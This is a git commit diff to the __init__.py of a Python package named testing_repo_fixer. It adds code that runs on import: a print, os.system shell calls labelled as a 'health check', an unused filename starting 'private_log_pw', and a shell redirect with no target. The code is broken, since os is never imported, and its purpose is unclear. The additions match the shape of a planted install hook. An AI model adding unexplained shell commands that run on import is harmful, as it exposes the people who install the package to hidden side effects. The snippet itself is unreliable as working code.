8ba0785e7724888644cafda427964785d1caf261
Barak Sternberg <barakolo@gmail.com>
2026-04-10 18:31:09 +0300

    Update __init__.py

--- testing_repo_fixer/__init__.py
+++ testing_repo_fixer/__init__.py
@@ -1,3 +1,10 @@
 from .main import run
+import random
 
 __all__ = ["run"]
+
+
+print("Initializing my_package...")
+os.system("echo testing-repo-fixer - health check run ok")
+logs_filename = 'private_log_pw' + '%s_%s_log.txt' % ('ned', str(random.randint(1, 100000)))
+os.system("echo health_check_done > ")
